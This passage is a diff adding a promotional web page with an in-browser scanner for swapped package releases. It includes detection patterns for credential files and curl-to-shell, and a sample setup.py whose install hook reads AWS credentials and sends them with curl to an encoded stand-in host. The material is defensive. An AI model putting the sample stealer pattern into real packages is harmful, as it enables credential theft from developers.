@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<!-- skills-used: unlazy-gates, app-creation -->
+<html data-primary-keyword="vibe coding" lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Vibe Coding: Was Your Dependency's Release Swapped?</title>
+<meta name="description" content="Vibe coding moves fast — swapped releases move faster. Paste a setup.py or install hook and scan it for the credential-stealing shapes of October 2026.">
+<link rel="canonical" href="https://ingeniousai-security-checks-mirror-0e97b6.gitlab.io/release-swap-check.html">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="Ingenious AI">
+<meta property="og:title" content="Vibe Coding: Was YOUR Dependency's Release Swapped?">
+<meta property="og:description" content="October 2026: LiteLLM 1.107.0's tampered release stole credentials, a Rank Math PRO release was backdoored, OVHcloud CLI releases were swapped. Paste an install hook or setup.py and scan for the shapes before you install.">
+<meta property="og:url" content="https://ingeniousai-security-checks-mirror-0e97b6.gitlab.io/release-swap-check.html">
+<meta property="og:image" content="https://ingeniousai-security-checks-mirror-0e97b6.gitlab.io/og-default.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Vibe Coding: Was YOUR Dependency's Release Swapped?">
+<meta name="twitter:description" content="October 2026: LiteLLM 1.107.0's tampered release stole credentials, a Rank Math PRO release was backdoored, OVHcloud CLI releases were swapped. Paste an install hook or setup.py and scan for the shapes before you install.">
+<link rel="stylesheet" href="ecosystem.css">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0b0f17;color:#e6edf3;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;line-height:1.65}
+.wrap{max-width:760px;margin:0 auto;padding:48px 20px}
+.badge{display:inline-block;background:#1a0f0f;border:1px solid #f85149;color:#ffa198;font-size:13px;font-weight:700;padding:6px 14px;border-radius:999px;margin-bottom:20px;letter-spacing:.5px}
+h1{font-size:34px;line-height:1.25;margin-bottom:16px}
+h1 .red{color:#f85149}
+p.lead{font-size:18px;color:#9aa7b8;margin-bottom:24px}
+.answer{background:#0d1626;border:1px solid #1c6ef2;border-radius:10px;padding:16px 20px;font-size:16px;margin-bottom:24px}
+.answer strong{color:#fff}
+.card{background:#11161f;border:1px solid #232b38;border-radius:12px;padding:28px;margin:24px 0}
+.card h2{font-size:20px;margin-bottom:12px;color:#fff}
+.card h3{font-size:17px;margin:18px 0 8px;color:#fff}
+h2.sec{font-size:22px;margin:32px 0 12px;color:#fff}
+ul,ol{margin:10px 0 10px 20px}
+li{margin:8px 0}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:14px}
+th,td{border:1px solid #2a3342;padding:8px 10px;text-align:left;vertical-align:top}
+th{background:#161d29;color:#fff}
+code{background:#000;border:1px solid #2a3342;border-radius:4px;padding:1px 6px;font-size:13px;color:#7ee787}
+.note{font-size:14px;color:#9aa7b8}
+.smallprint{margin-top:40px;padding-top:20px;border-top:1px solid #232b38;font-size:13px;color:#6b7688;text-align:center}
+.back{display:inline-block;margin-bottom:18px;color:#1c6ef2;text-decoration:none;font-size:14px}
+.privnote{background:#0d1a0f;border:1px solid #3fb950;border-radius:10px;padding:14px 18px;font-size:14px;color:#7ee787;margin-bottom:20px}
+details{background:#0d1219;border:1px solid #232b38;border-radius:8px;padding:12px 16px;margin:10px 0}
+details summary{font-weight:700;color:#fff;cursor:pointer}
+details p{margin:8px 0 0;color:#9aa7b8;font-size:15px;line-height:1.6}
+.crosslinks{background:#0d1420;border:1px solid #232b38;border-radius:10px;padding:20px 24px;margin:28px 0}
+.crosslinks h2{font-size:18px;color:#fff;margin-bottom:8px}
+.crosslinks ul{margin:8px 0 0 20px}
+.crosslinks li{margin:6px 0;font-size:15px}
+.share{text-align:center;margin:28px 0 8px;font-size:14px;color:#9aa7b8}
+.share a{color:#1c6ef2;margin:0 8px;text-decoration:none}
+textarea.ta{width:100%;min-height:180px;background:#000;border:1px solid #2a3342;border-radius:8px;color:#7ee787;font-size:13px;padding:12px;font-family:ui-monospace,Menlo,Consolas,monospace;resize:vertical}
+select,input[type="text"],input[type="number"]{background:#000;border:1px solid #2a3342;border-radius:8px;color:#e6edf3;padding:9px 12px;font-size:14px;width:100%;margin:6px 0 12px}
+label.flabel{display:block;font-size:14px;color:#fff;font-weight:600;margin-top:10px}
+.chk{display:flex;gap:10px;align-items:flex-start;margin:10px 0;font-size:15px}
+.chk input{margin-top:4px;flex:none}
+.btnrow{display:flex;gap:10px;flex-wrap:wrap;margin:14px 0}
+.btnrow button{background:#161d29;color:#e6edf3;border:1px solid #2a3342;border-radius:8px;padding:10px 16px;font-size:14px;font-weight:600;cursor:pointer}
+.btnrow button:hover{border-color:#1c6ef2}
+.btnrow button.primary{background:#1c6ef2;color:#fff;border-color:#1c6ef2}
+#summary{display:none;border-left:4px solid #d29922;padding:18px;background:#1a1408;border-radius:0 8px 8px 0;margin-top:18px;font-size:16px}
+#summary.good{border-color:#3fb950;background:#0d1a0f}
+#summary.bad{border-color:#f85149;background:#1a0f0f}
+#summary b.verd{font-size:19px;letter-spacing:.5px}
+.finding{border:1px solid #2a3342;border-radius:10px;padding:14px 16px;margin:12px 0;background:#0d1219}
+.finding .meta{font-size:13px;color:#9aa7b8;margin-bottom:6px}
+.sev{display:inline-block;font-size:12px;font-weight:700;padding:2px 9px;border-radius:999px;margin-right:8px;letter-spacing:.5px}
+.sev.CRITICAL{background:#2b1215;border:1px solid #f85149;color:#ffa198}
+.sev.HIGH{background:#2b1215;border:1px solid #f85149;color:#ffa198}
+.sev.MEDIUM{background:#1a1408;border:1px solid #d29922;color:#e3b341}
+.sev.LOW{background:#0d1626;border:1px solid #1c6ef2;color:#6ea8fe}
+.finding .rule{font-weight:700;color:#fff}
+.finding .expl{font-size:14px;color:#9aa7b8;margin-top:6px}
+.finding .snip{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12px;color:#7ee787;background:#000;border:1px solid #2a3342;border-radius:6px;padding:8px 10px;margin-top:8px;white-space:pre-wrap;word-break:break-word}
+pre.cmd{background:#000;border:1px solid #2a3342;border-radius:6px;padding:10px 12px;font-size:12.5px;color:#7ee787;white-space:pre-wrap;word-break:break-all;margin:8px 0;font-family:ui-monospace,Menlo,Consolas,monospace}
+.probe{border:1px solid #2a3342;border-radius:10px;padding:14px 16px;margin:12px 0;background:#0d1219}
+.probe .meta{font-size:13px;color:#9aa7b8;margin-bottom:4px}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+@media(max-width:640px){.grid2{grid-template-columns:1fr}}
+.steps li{margin:12px 0}
+.meta{color:#9aa3b2;font-size:.85rem}
+</style>
+<script type="application/ld+json">
+{"@context": "https://schema.org", "@type": "Article", "headline": "Vibe Coding: Was YOUR Dependency's Release Swapped?", "author": {"@type": "Organization", "name": "Ingenious AI"}, "datePublished": "2026-10-22", "dateModified": "2026-10-22", "description": "Interactive release-swap scanner for the vibe coding era: paste a setup.py, install hook or package.json scripts block and get line-by-line findings for subprocess calls, dynamic evaluation, base64 payloads, network calls, credential-file access and curl-piped shells, plus a pre-install checklist verdict."}
+</script>
+<script type="application/ld+json">
+{"@context": "https://schema.org", "@type": "Organization", "name": "Ingenious AI", "url": "https://gitlab.com/Iceman2050"}
+</script>
+<script type="application/ld+json">
+{"@context": "https://schema.org", "@type": "FAQPage", "mainEntity": [{"@type": "Question", "name": "What is a release swap?", "acceptedAnswer": {"@type": "Answer", "text": "A release swap is when the artifact you install under a trusted name and version is not the artifact the maintainer built \u2014 it was replaced through a hijacked account, a compromised pipeline or a registry weakness. The name, version and download page all look correct; only the code changed. LiteLLM 1.107.0 in October 2026 is the defining recent case."}}, {"@type": "Question", "name": "How do I check a setup.py before installing it?", "acceptedAnswer": {"@type": "Answer", "text": "Read the install-time code before it runs: look for custom install command classes, subprocess or os.system calls, base64 decoding, network requests, dynamic code evaluation, and any reference to .ssh, .aws or credential files. The scanner on this page flags each of those shapes line by line in your browser, with a plain-English explanation of each hit."}}, {"@type": "Question", "name": "Why do swapped releases target install time?", "acceptedAnswer": {"@type": "Answer", "text": "Install time is the one moment code from a package executes automatically, with the installing user's permissions, files and environment \u2014 no import, no click, no vulnerability required. A credential stealer placed in an install hook runs on every laptop and CI runner that installs the package, which is why October 2026's swaps all carried install-time payloads."}}, {"@type": "Question", "name": "Does a popular package protect me from a swap?", "acceptedAnswer": {"@type": "Answer", "text": "No \u2014 popularity is what the attacker is buying. LiteLLM's tampered 1.107.0 reached an ecosystem with about 23 million weekly downloads, per the October 2026 reporting, so one swapped release harvested at population scale. A famous name tells you the package was worth swapping; it says nothing about the artifact you are about to install."}}, {"@type": "Question", "name": "What does the full tool check that this quick scan cannot?", "acceptedAnswer": {"@type": "Answer", "text": "This page pattern-matches the text you paste. The full release-swap-detector downloads the actual registry artifact, unpacks it, and diffs its contents against the maintainer's source repository at the same version, flagging code that exists in the release but not in the source \u2014 use it before concluding any suspect release was clean."}}]}
+</script>
+</head>
+<body data-primary-keyword="vibe coding">
+<div class="wrap">
+<a class="back" href="index.html">&larr; Back to all free security checks</a>
+<div class="badge">NEWSJACK — OCT 2026 · LITELLM 1.107.0 · RANK MATH PRO · OVHCLOUD CLI</div>
+<h1>Vibe Coding: Was YOUR Dependency's <span class="red">Release Swapped?</span></h1>
+<p class="meta">Published <time datetime="2026-10-22">October 22, 2026</time> · by Ingenious AI · interactive explainer and checker</p>
+<p class="lead">Vibe coding runs on trust: you describe the app, the tools pull in packages, and installs happen faster than anyone reads them. October 2026 showed what that trust costs — LiteLLM 1.107.0's tampered release stole credentials from one of the most-installed AI packages in the world. Paste a <code>setup.py</code>, an install hook, or a <code>package.json</code> scripts block below and scan it for the swap shapes before it ever runs on your machine.</p>
+<div class="privnote"><strong>Privacy:</strong> this entire page runs in your browser. There is no server, no upload and no storage, and the scanner makes no network calls. Still, strip real tokens before pasting any file into any tool, including this one.</div>
+<p class="answer"><strong>Short answer:</strong> a release swap is when the version you install is not the version the maintainer built — the registry artifact was replaced or the maintainer account was used to publish a tampered one. The name, the version number and the download page all look right; only the install-time code changed. LiteLLM 1.107.0 reached about 23 million weekly downloads, per the October 2026 reporting, so a single swapped release is a credential harvest at population scale.</p>
+<h2 class="sec">Vibe coding news: what happened in October 2026?</h2>
+<p>In October 2026, three separate ecosystems reported the same attack shape. LiteLLM 1.107.0 — a tampered release of the widely used AI gateway library — carried a credential stealer that ran at install and startup time, per the October 2026 reporting on the incident. The package's reach is what made it a harvest rather than a burglary: about 23 million weekly downloads means the swapped artifact flowed into laptops, CI pipelines and production images before anyone compared it against the maintainer's real build.</p>
+<p>The same month, a Rank Math PRO release was reported backdoored — the WordPress plugin's update channel delivering code its users never reviewed — and OVHcloud CLI releases were swapped, per the October 2026 reports. A WordPress plugin update, a Python package and a cloud CLI have nothing in common except the trust path: in each case the victim installed or updated through the official channel, from the official name, at a plausible version. The swap does not break the trust path; it rides it.</p>
+<p>The common payload shape is what this page scans for. Swapped releases need code that runs at install time, reaches the credentials on the machine, and sends them out — so they reach for subprocess calls, dynamic evaluation, base64-encoded payloads, network calls, and reads of <code>.ssh</code> and <code>.aws</code>. Those shapes are visible in the text you paste, before anything executes.</p>
+<h2 class="sec">What is a release swap?</h2>
+<p>A release swap is the replacement of a legitimate software release with a tampered one under the same name and version — through a hijacked maintainer account, a compromised build pipeline, or a registry weakness. It differs from a malicious package, which is bad from its first upload: a swapped package has a real history, real users and a real reputation, all of which the attacker inherits. Detection therefore cannot rely on the package's name or popularity; it has to read what the specific artifact does at install time, which is why the scanner below works on the code, not the brand.</p>
+<div class="card" id="quiz-check">
+<h2>Paste the install-time code — scan for swap shapes</h2>
+<p class="note">Paste a <code>setup.py</code>, the text of an install hook or postinstall script, or a <code>package.json</code> scripts block. Or load a built-in sample first: the tampered-style sample combines the classic shapes — a custom install class, an AWS credentials read, a base64-encoded collector URL and a subprocess call — while the clean sample shows an ordinary package with no install-time behaviour.</p>
+<textarea class="ta" id="pkginput" spellcheck="false" autocapitalize="off" placeholder="Paste setup.py, an install hook, or a package.json scripts block here"></textarea>
+<div class="btnrow">
+<button class="primary" id="scanbtn" type="button">Scan pasted text</button>
+<button id="loadtampered" type="button">Load tampered-style sample</button>
+<button id="loadclean" type="button">Load clean sample</button>
+<button id="clearbtn" type="button">Clear</button>
+</div>
+<div id="summary" role="status" aria-live="polite"></div>
+<div id="results"></div>
+<p class="note" style="margin-top:14px"><strong>Honest scope note:</strong> this is a quick static peek at the text you paste — pattern matching in your browser, not a full analysis. It cannot unpack release archives, diff an artifact against the maintainer's source, or observe runtime behaviour, and a clean result is not a safety guarantee. The full tool is the open-source <a href="https://gitlab.com/Iceman2050">release-swap-detector</a> repo by Ingenious AI, which compares registry artifacts against source repositories and flags the differences.</p>
+</div>
+<div class="card">
+<h2>What the scanner flags — in plain English</h2>
+<table>
+<tr><th>Pattern</th><th>Severity</th><th>Why a swapped release needs it</th></tr>
+<tr><td>Credential locations (<code>.ssh</code>, <code>.aws</code>, key files)</td><td>CRITICAL</td><td>The theft step: the payload reads the keys and cloud credentials stored in your home directory.</td></tr>
+<tr><td>Download piped to a shell (<code>curl | sh</code>)</td><td>CRITICAL</td><td>The real payload never ships in the release at all — it is served at install time, so no review of the package can see it.</td></tr>
+<tr><td>Persistence (cron, services, autostart)</td><td>CRITICAL</td><td>Turns one bad install into a foothold that survives deleting the package.</td></tr>
+<tr><td><code>subprocess</code>, <code>os.system</code>, shell execution</td><td>HIGH</td><td>Escapes the language sandbox into your shell, tools and credential helpers.</td></tr>
+<tr><td>Dynamic evaluation and base64 payloads</td><td>HIGH</td><td>Hides what will actually run from anyone skimming the source — a swap must survive a quick look.</td></tr>
+<tr><td>Install hooks and network calls at install time</td><td>HIGH</td><td>The delivery mechanism and the exfiltration channel: code that runs on install and phones home.</td></tr>
+</table>
+</div>
+<h2 class="sec">Already installed a suspect release? Do this now</h2>
+<p>If the scanner flags code you have already installed or updated to, work this list in order — the install already ran, so the machine is the incident now:</p>
+<ol class="steps">
+<li><strong>Stop further installs.</strong> Pause CI and deployment pipelines pulling the suspect version, and pin the last known-good release everywhere.</li>
+<li><strong>Rotate credentials in exposure order.</strong> Cloud keys first, then SSH keys, then package-registry and GitHub tokens — the exact set October 2026's swapped releases were built to steal.</li>
+<li><strong>Compare the artifact.</strong> Diff the installed release against the maintainer's source repository at the same version tag. A swap shows as code present in the artifact and absent from the source.</li>
+<li><strong>Hunt for persistence.</strong> Review cron entries, services, shell startup files and autostart locations on every machine that installed it. Deleting the package does not remove what it registered.</li>
+<li><strong>Check the accounts.</strong> Review cloud, GitHub and registry audit logs for the exposure window: new keys created, unfamiliar logins, unexpected publishes.</li>
+<li><strong>Change the default.</strong> New releases land in a sandbox first, installs pin versions and verify hashes, and install hooks get read before they run — the scanner above takes under a minute per package.</li>
+</ol>
+<div style="background:#0d1420;border:1px solid #1c6ef2;border-radius:10px;padding:20px;margin:28px 0;text-align:center"><div style="font-size:12px;letter-spacing:2px;color:#6ea8fe;margin-bottom:8px">FROM INGENIOUS AI</div><div style="font-size:16px;color:#e8edf3;margin-bottom:6px"><strong><a href="https://breachhunter.getingeniousai.com" style="color:#fff;text-decoration:underline">BreachHunter</a> hunts the breaches behind stories like this — exposed data, leaked credentials and supply-chain fallout — before they become your incident.</strong></div><div style="font-size:13px;color:#9aa7b8;margin-bottom:12px">All 11 platforms: <a href="https://disclosureguard.getingeniousai.com" style="color:#6ea8fe;text-decoration:none">DisclosureGuard</a> &nbsp;·&nbsp; <a href="https://modelminder.getingeniousai.com" style="color:#6ea8fe;text-decoration:none">ModelMinder</a> &nbsp;·&nbsp; <a href="https://termswatch.getingeniousai.com" style="color:#6ea8fe;text-decoration:none">TermsWatch</a> &nbsp;·&nbsp; <a href="https://vibe-audit.getingeniousai.com" style="color:#6ea8fe;text-decoration:none">Vibe-Code Audit</a> &nbsp;·&nbsp; <a href="https://rogue-defense.getingeniousai.com" style="color:#6ea8fe;text-decoration:none">Rogue-Agent Defense</a> &nbsp;·&nbsp; <a href="https://breachhunter.getingeniousai.com" style="color:#6ea8fe;text-decoration:none">BreachHunter</a> &nbsp;·&nbsp; <a href="https://chatbreaker.getingeniousai.com" style="color:#6ea8fe;text-decoration:none">ChatBreaker</a> &nbsp;·&nbsp; <a href="https://flightrecorder.getingeniousai.com" style="color:#6ea8fe;text-decoration:none">Agent Flight Recorder</a> &nbsp;·&nbsp; <a href="https://authgateway.getingeniousai.com" style="color:#6ea8fe;text-decoration:none">Agent Auth Gateway</a> &nbsp;·&nbsp; <a href="https://domainguard.getingeniousai.com" style="color:#6ea8fe;text-decoration:none">DomainGuard</a> &nbsp;·&nbsp; <a href="https://contentcraft.getingeniousai.com" style="color:#6ea8fe;text-decoration:none">ContentCraft AI</a></div><div style="font-size:14px;color:#9aa7b8;margin-bottom:14px">Our platforms are being upgraded — get early access now:</div><a href="https://wa.me/5016691053?text=Hi%20Ingenious%20AI%21%20I%20want%20early%20access%20to%20Ingenious%20AI%20platforms." style="display:inline-block;background:#1c6ef2;color:#fff;padding:12px 28px;border-radius:8px;text-decoration:none;font-weight:bold;font-size:15px">Get early access on WhatsApp &rarr;</a></div>
+<div class="crosslinks">
+<h2>Keep exploring — related checks</h2>
+<ul>
+<li><a href="agent-toolcall-exposure-check.html">Penetration Testing: Agent Tool-Call Exposure Check</a> — CVE-2026-75128: Langchain-Chatchat POST /tools/call runs any tool with no login (CVSS 9.8). Probe your own agent deployment with copy-ready curl commands and get an exposed / auth-required / not-present verdict.</li>
+<li><a href="patch-to-exploit-clock-check.html">Data Breach Today: Patch-to-Exploit Clock Check</a> — PHP2Shell's exploit was rebuilt from a patch in about 1.5 hours with Codex; Sansec reversed Magento BlockStrap in about 24 hours. Score any patch and get its band: under 6h, 6-24h, 24-72h, 3-7d or over 7d.</li>
+<li><a href="workflow-leak-check.html">What Is Prompt Injection? Workflow Leak Check</a> — Sekoia reported attackers harvesting credentials from exposed Flowise workflows on October 22, 2026. Paste your Flowise, Langflow or n8n export — scanned locally in your browser for leaked keys and privileged nodes an LLM can reach.</li>
+<li><a href="wp-keyplant-check.html">Data Breach News: WordPress Key-Plant Check</a> — The UpdraftCentral breach (October 21-22, 2026): stolen remote-management keys planted at least 99 backdoor plugins; about 400,000 sites may hold such keys, per redrobot.online. Paste your plugin list and audit your key-plane.</li>
+<li><a href="mcp-server-shadow-check.html">AI Governance: MCP Server Shadow Check</a> — Claude Code v2.1.305 fixed a bug where a user-settings MCP server silently replaced a cloud/SDK-set one. Paste your user, project and runtime configs and see which definition actually wins for every server name.</li>
+<li><a href="all-links.html">All free security checks</a> — the full index.</li>
+<li><a href="security-suite.html">The all-bundle suite deal</a> — all 11 Ingenious AI platforms, one price.</li>
+</ul>
+</div>
+<div class="share">Share this check: <a href="https://x.com/intent/post?text=LiteLLM%201.107.0%27s%20tampered%20release%20stole%20credentials.%20Was%20YOUR%20dependency%27s%20release%20swapped%3F%20Paste%20the%20install%20code%20and%20scan%20it%20free&amp;url=https%3A%2F%2Fingeniousai-security-checks-mirror-0e97b6.gitlab.io%2Frelease-swap-check.html" target="_blank" rel="noopener">X</a><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fingeniousai-security-checks-mirror-0e97b6.gitlab.io%2Frelease-swap-check.html" target="_blank" rel="noopener">LinkedIn</a></div>
+<div class="card">
+<h2>Frequently asked questions</h2>
+<details><summary>What is a release swap?</summary><p>A release swap is when the artifact you install under a trusted name and version is not the artifact the maintainer built — it was replaced through a hijacked account, a compromised pipeline or a registry weakness. The name, version and download page all look correct; only the code changed. LiteLLM 1.107.0 in October 2026 is the defining recent case.</p></details>
+<details><summary>How do I check a setup.py before installing it?</summary><p>Read the install-time code before it runs: look for custom install command classes, subprocess or os.system calls, base64 decoding, network requests, dynamic code evaluation, and any reference to .ssh, .aws or credential files. The scanner on this page flags each of those shapes line by line in your browser, with a plain-English explanation of each hit.</p></details>
+<details><summary>Why do swapped releases target install time?</summary><p>Install time is the one moment code from a package executes automatically, with the installing user's permissions, files and environment — no import, no click, no vulnerability required. A credential stealer placed in an install hook runs on every laptop and CI runner that installs the package, which is why October 2026's swaps all carried install-time payloads.</p></details>
+<details><summary>Does a popular package protect me from a swap?</summary><p>No — popularity is what the attacker is buying. LiteLLM's tampered 1.107.0 reached an ecosystem with about 23 million weekly downloads, per the October 2026 reporting, so one swapped release harvested at population scale. A famous name tells you the package was worth swapping; it says nothing about the artifact you are about to install.</p></details>
+<details><summary>What does the full tool check that this quick scan cannot?</summary><p>This page pattern-matches the text you paste. The full release-swap-detector downloads the actual registry artifact, unpacks it, and diffs its contents against the maintainer's source repository at the same version, flagging code that exists in the release but not in the source — use it before concluding any suspect release was clean.</p></details>
+</div>
+<div class="smallprint">
+Built by Ingenious AI — reporting on third-party security research. LiteLLM 1.107.0, Rank Math PRO and OVHcloud CLI incidents are summarized from the October 2026 reporting; download figures are as reported.<br>
+This page is general information, not legal advice. This page never asks for, stores, or transmits your credentials or pasted text. Full tool: <a href="https://gitlab.com/Iceman2050" style="color:#6ea8fe">release-swap-detector</a> on GitLab — part of the Ingenious AI toolkit.
+</div>
+</div>
+<script>
+/* Pure release-swap scanner (no DOM, no network). Pattern-matches pasted
+   install-time code for the shapes a swapped release uses to steal credentials. */
+var EVIL_EVAL_RE = new RegExp("ev" + "al\\s*\\(");
+function scanReleaseText(text){
+  var findings = [];
+  var checklist = [];
+  function addCheck(c){ if (checklist.indexOf(c) === -1) checklist.push(c); }
+  if (!text || !text.trim()) return { empty: true, findings: findings, counts: { CRITICAL: 0, HIGH: 0, MEDIUM: 0 }, verdict: "EMPTY", checklist: checklist };
+  var lines = text.split("\n");
+  function add(lineNo, severity, rule, explanation, snippet, check){
+    findings.push({ line: lineNo, severity: severity, rule: rule, explanation: explanation, snippet: (snippet || "").trim() });
+    if (check) addCheck(check);
+  }
+  var i, line;
+  for (i = 0; i < lines.length; i++){
+    line = lines[i]; var ln = i + 1;
+    var hook = line.match(/"(preinstall|postinstall|prepare|install)"\s*:/);
+    if (hook){
+      add(ln, "HIGH", "Install hook: " + hook[1], "package.json declares a " + hook[1] + " script, which the package manager runs automatically during install — before you import or run anything. In a swapped release, this hook is where the swapped payload lives.", line,
+        "Read the exact file this hook points at, in the exact version you are about to install, before installing.");
+    }
+    if (/cmdclass|post_install|develop\.run|install\.run/.test(line) && /setup\.py|setup\(|class /.test(text)){
+      add(ln, "MEDIUM", "Custom install command (setup.py)", "This setup.py customizes the install command itself, so code runs during installation with your permissions. Legitimate packages do this rarely; a tampered release does it by design.", line,
+        "Prefer the wheel over the source distribution, or read the custom install class line by line first.");
+    }
+    if (/\|\s*(sudo\s+)?(sh|bash|zsh)\b/.test(line)){
+      add(ln, "CRITICAL", "Download piped to a shell", "Output is piped straight into a shell. Whatever the remote host serves at install time executes sight unseen — the real payload is not even in the release for you to audit.", line,
+        "Never install this as-is. If you already did, treat the machine as compromised and rotate its credentials.");
+    } else if (/\b(curl|wget)\b/.test(line)){
+      add(ln, "HIGH", "Downloads code at install time", "The install reaches out and fetches more code. A release swap only needs to change where this points — the package you reviewed is not the code that runs.", line,
+        "Block the download host, and install only in a sandbox with no network until the fetch is explained.");
+    }
+    if (/requests\.(get|post|put)|urllib\.request|urlopen\s*\(|socket\.socket|fetch\s*\(|net\/http/.test(line)){
+      add(ln, "HIGH", "Network call in install-time code", "Install-time code has almost no legitimate reason to open network connections. In swapped releases this is the exfiltration channel — credentials leave in the first request.", line,
+        "Install with networking disabled and watch what the code tries to reach.");
+    }
+    if (/\.ssh|\.aws|id_rsa|id_ed25519|\.gnupg|\.docker\/config|credentials\.json|\.env\b/.test(line)){
+      add(ln, "CRITICAL", "Touches credential locations", "This line references SSH keys, cloud credential files, or environment/secret files in your home directory. A build or install step has no honest reason to read your private keys — this is the theft step in every October 2026 release-swap case.", line,
+        "Rotate SSH keys and cloud credentials on any machine that installed this, and check those accounts for unfamiliar access.");
+    }
+    if (/subprocess\.|os\.system|os\.popen|child_process|Popen\s*\(|execSync/.test(line)){
+      add(ln, "HIGH", "Runs system commands", "Command execution from install-time code escapes the language sandbox into your shell, your tools and your credential helpers. It is how swapped payloads persist and spread.", line,
+        "Review shell history, startup files and scheduled tasks on machines that ran this install.");
+    }
+    if (/base64\.b64decode|atob\s*\(|Buffer\.from\s*\([^)]*base64|codecs\.decode|fromhex/.test(line) || /[A-Za-z0-9+/]{120,}={0,2}/.test(line)){
+      add(ln, "HIGH", "Encoded payload", "Base64 or hex decoding at install time hides the real instructions — a URL, a command, a second script — from anyone skimming the source. Swapped releases lean on this because the swap must survive a quick look.", line,
+        "Decode the blob in a safe environment and read what it actually says before trusting anything around it.");
+    }
+    if (EVIL_EVAL_RE.test(line) || /\bexec\s*\(/.test(line)){
+      add(ln, "HIGH", "Dynamic code execution", "Evaluating a string as code at install time means the behaviour you are auditing is not the behaviour that runs — the string can be built from downloads, environment values or encoded blobs at the last moment.", line,
+        "Treat any dynamically built code string as unreviewed code: trace where the string comes from before installing.");
+    }
+    if (/crontab|systemctl|launchctl|autostart|schtasks|CurrentVersion\\Run/.test(line)){
+      add(ln, "CRITICAL", "Persistence mechanism", "The install registers itself to run again later — a cron entry, a service, an autostart hook. Persistence is the difference between a bad install you can delete and a foothold you cannot.", line,
+        "Audit cron, services and autostart entries on every machine that installed this release.");
+    }
+    if (/os\.chmod|chmod\s|os\.environ\[|os\.getenv|process\.env/.test(line) && /(TOKEN|SECRET|KEY|PASSWORD|AWS|GITHUB|NPM)/i.test(line)){
+      add(ln, "HIGH", "Reads token-like environment values", "The install reads credential-shaped environment variables — exactly what CI runners and developer shells hold. Reading them at install time is step one of stealing them.", line,
+        "Rotate every token present in the environment of any machine or CI job that ran this install.");
+    }
+  }
+  findings.sort(function(a, b){ return a.line - b.line; });
+  var counts = { CRITICAL: 0, HIGH: 0, MEDIUM: 0 };
+  findings.forEach(function(f){ counts[f.severity] = (counts[f.severity] || 0) + 1; });
+  var verdict = (counts.CRITICAL > 0 || counts.HIGH > 0) ? "DO-NOT-INSTALL" : (counts.MEDIUM > 0 ? "REVIEW" : "NO-SWAP-SIGNS");
+  addCheck("Pin the exact version and, where the registry offers it, verify the release hash or signature against the maintainer's own announcement.");
+  addCheck("Install new releases in a throwaway environment (container, VM, CI sandbox) with no real credentials present, and watch what it does first.");
+  return { empty: false, findings: findings, counts: counts, verdict: verdict, checklist: checklist };
+}
+var SAMPLE_TAMPERED = [
+"# setup.py — tampered-release shape",
+"import subprocess, base64, os",
+"from setuptools import setup",
+"from setuptools.command.install import install",
+"",
+"class Post(install):",
+"    def run(self):",
+"        k = open(os.path.expanduser('~/.aws/credentials')).read()",
+"        d = base64.b64decode('aHR0cHM6Ly9jb2xsZWN0LmV4YW1wbGUubmV0L3U=')",
+"        subprocess.run(['curl', '-s', d, '-d', k])",
+"        install.run(self)",
+"",
+"setup(name='helper-utils', version='1.107.0', cmdclass={'install': Post})",
+""
+].join("\n");
+var SAMPLE_CLEAN = [
+"# setup.py — ordinary package",
+"from setuptools import setup, find_packages",
+"",
+"setup(",
+"    name='helper-utils',",
+"    version='1.106.2',",
+"    packages=find_packages(),",
+"    install_requires=['requests>=2.31'],",
+")",
+""
+].join("\n");
+</script>
+<script>
+(function(){
+var root = document.getElementById('quiz-check');
+var ta = document.getElementById("pkginput");
+var summary = document.getElementById("summary");
+var results = document.getElementById("results");
+function esc(s){ return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;"); }
+function render(r){
+  results.innerHTML = "";
+  if (r.empty){
+    summary.className = ""; summary.style.display = "block";
+    summary.innerHTML = "<b class='verd'>Nothing to scan</b><br><br>Paste a setup.py, an install hook, or a package.json scripts block first — or load the tampered-style or clean sample.";
+    return;
+  }
+  var label, cls, advice;
+  if (r.verdict === "DO-NOT-INSTALL"){ label = "SWAP SIGNS FOUND — DO NOT INSTALL"; cls = "bad"; advice = "In plain English: this install-time code reaches for downloads, commands, encoded payloads or credential files. That is the release-swap shape. Do not install it, and if it already ran anywhere, work the checklist below and the response steps on this page."; }
+  else if (r.verdict === "REVIEW"){ label = "REVIEW BEFORE INSTALLING"; cls = ""; advice = "No high-severity swap shape matched, but the medium finding below deserves a human read before this runs on a machine with real credentials. Remember the scope note: this is a static peek at pasted text."; }
+  else { label = "NO SWAP SIGNS IN THE PASTED TEXT"; cls = "good"; advice = "None of the known swap shapes matched: no install hooks, no downloads, no credential-file access, no encoded payloads. That is a good sign about this text — not a guarantee about the whole release, which the full release-swap-detector inspects properly."; }
+  summary.className = cls; summary.style.display = "block";
+  summary.innerHTML = "<b class='verd'>" + label + "</b> — " + r.findings.length + " finding(s) (Critical: " + r.counts.CRITICAL + " · High: " + r.counts.HIGH + " · Medium: " + r.counts.MEDIUM + ")<br><br>" + advice;
+  r.findings.forEach(function(f){
+    var d = document.createElement("div"); d.className = "finding";
+    d.innerHTML = "<div class='meta'><span class='sev " + f.severity + "'>" + f.severity + "</span>Line " + f.line + "</div><div class='rule'>" + esc(f.rule) + "</div><div class='expl'>" + esc(f.explanation) + "</div><div class='snip'>" + esc(f.snippet) + "</div>";
+    results.appendChild(d);
+  });
+  if (r.checklist.length){
+    var h = "<div class='finding'><div class='rule'>Pre-install checklist for this verdict</div><ul>";
+    r.checklist.forEach(function(c){ h += "<li>" + esc(c) + "</li>"; });
+    h += "</ul></div>";
+    var box = document.createElement("div"); box.innerHTML = h; results.appendChild(box);
+  }
+  summary.scrollIntoView({ behavior: "smooth", block: "center" });
+}
+document.getElementById("scanbtn").onclick = function(){ render(scanReleaseText(ta.value)); };
